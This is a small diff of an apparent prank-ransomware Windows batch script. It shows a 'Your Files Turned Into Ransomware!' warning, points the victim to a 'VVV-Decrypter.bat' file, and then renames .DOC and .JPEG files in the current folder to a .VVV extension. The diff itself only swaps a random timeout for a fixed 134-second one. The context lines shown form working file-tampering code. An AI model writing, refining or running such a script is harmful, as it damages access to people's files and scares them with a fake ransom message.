@@ -5,7 +5,7 @@ title Warning!
 echo [^] Oooops,Your Files Turned Into Ransomware!
 echo If You Did Not Ask For This,Please Close The Window.
 echo Then Open VVV-Decrypter.bat
-timeout %random%
+timeout 134
 pause
 REN *.DOC *.VVV
 REN *.JPEG *.VVV
